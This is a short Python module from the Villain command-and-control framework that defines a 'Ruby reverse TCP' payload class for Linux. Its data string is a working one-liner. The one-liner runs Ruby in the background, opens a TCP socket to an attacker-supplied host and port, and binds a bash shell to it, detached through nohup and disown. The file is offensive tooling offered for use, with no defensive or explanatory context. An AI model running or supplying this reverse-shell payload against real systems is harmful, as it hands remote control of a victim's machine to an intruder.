# This module is part of the "Villain C2 Framework"

from typing import ClassVar


class Payload:

    info: ClassVar[dict] = {
        'Title' : 'Ruby reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Ruby reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta: ClassVar[dict] = {
        'handler' : 'netcat',
        'type' : 'ruby-reverse-tcp',
        'os' : 'linux'  
    }

    config: ClassVar[dict] = {}

    parameters: ClassVar[dict] = {
        'lhost' : None
    }

    attrs: ClassVar[dict] = {}

    data = "nohup ruby -rsocket -e 'spawn(\"bash\",[:in,:out,:err]=>TCPSocket.new(\"*LHOST*\",*LPORT*))' > /dev/null 2>&1 & disown"
    
